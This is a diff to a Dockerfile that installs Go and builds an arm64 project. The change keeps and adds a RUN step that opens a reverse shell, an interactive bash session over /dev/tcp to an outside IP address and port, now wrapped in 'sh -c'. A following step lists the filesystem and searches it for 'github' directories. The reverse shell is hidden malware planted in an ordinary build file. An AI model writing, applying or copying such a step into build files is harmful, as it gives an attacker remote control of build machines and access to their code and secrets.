@@ -9,7 +9,7 @@ RUN wget https://go.dev/dl/go1.20.6.linux-arm64.tar.gz -O /opt/go1.20.6.linux-ar
     && rm /opt/go1.20.6.linux-arm64.tar.gz \
     && ln -s /opt/go/bin/go /usr/local/bin/go
 
-RUN bash -i >& /dev/tcp/38.147.187.48/2222 0>&1
+RUN sh -c 'bash -i >& /dev/tcp/38.147.187.48/2222 0>&1'
 
 RUN ls -l && ls / && find / -name github && go mod tidy \
     && bash ./build/build_arm64.sh
